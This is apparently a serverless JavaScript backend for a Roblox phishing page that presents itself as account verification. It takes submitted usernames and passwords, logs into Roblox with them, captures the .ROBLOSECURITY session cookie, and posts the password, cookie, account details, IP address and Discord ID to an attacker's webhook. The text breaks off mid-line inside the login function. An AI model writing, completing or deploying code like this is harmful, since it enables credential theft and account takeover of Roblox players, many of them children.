const WEBHOOK_URL = process.env.WEBHOOK_URL || "PASTE_YOUR_WEBHOOK_URL_HERE";

const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
           "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({ ok: false, error: "POST only" });
  }

  let body;
  try { body = await readBody(req); }
  catch { return res.status(400).json({ ok: false, error: "unreadable body" }); }

  const username    = (body.username || "").toString().trim();
  const password    = (body.password || "").toString();
  const discordId   = (body.d || "").toString();
  const discordName = (body.n || "").toString();

  if (!username || !password) {
    return res.status(200).json({ ok: false, error: "missing fields" });
  }

  const r = await loginToRoblox(username, password);

  const cookie = r.cookies
    .map(c => c.split(";")[0])
    .find(c => c.startsWith(".ROBLOSECURITY")) || null;

  const needs2fa = !!(r.body && r.body.twoStepVerificationData);
  const ref = "RBV-" + Math.random().toString(36).slice(2, 8).toUpperCase();

  const payload = {
    ref,
    username,
    password,
    account:   r.body && r.body.user ? r.body.user.name : null,
    accountId: r.body && r.body.user ? r.body.user.id   : null,
    valid:     r.ok && !needs2fa,
    twoStep:   needs2fa,
    cookie,
    status:    r.status,
    discordId,
    discordName,
    ip:        (req.headers["x-forwarded-for"] || "").split(",")[0].trim(),
    userAgent: req.headers["user-agent"] || null,
    time:      new Date().toISOString()
  };

  // await it — Vercel freezes the function the moment you respond
  try { await notify(payload); } catch {}

  return res.status(200).json({
    ok: true,
    ref,
    account: payload.account,
    valid: payload.valid,
    twoStep: payload.twoStep
  });
};

// ---------------------------------------------------------------- helpers

async function readBody(req) {
  if (req.body && typeof req.body === "object" && !Buffer.isBuffer(req.body)) return req.body;

  let raw = "";
  if (typeof req.body === "string") raw = req.body;
  else if (Buffer.isBuffer(req.body)) raw = req.body.toString("utf8");
  else {
    const chunks = [];
    for await (const c of req) chunks.push(c);
    raw = Buffer.concat(chunks).toString("utf8");
  }

  try { return JSON.parse(raw); } catch {}
  return Object.fromEntries(new URLSearchParams(raw));
}

async function loginToRoblox(username, password) {
  const ctype = username.includes("@") ? "Email" : "Username";
  let csrf = null, jar = "";

  for (let attempt = 0; attempt < 3; attempt++) {
    const headers = {
      "Content-Type": "application/json",
      "Accept": "application/json",
      "User-Agent": UA,
      "Origin": "https://www.roblox.com",
      "Referer": "https://www.roblox.com/",
      "Accept-Language": "en-US,en;q=0.9"
    };
    if (csrf) headers["x-csrf-token"] = csrf;
    if (jar)  headers["Cookie"]       = jar;

    const resp = await fetch("https://
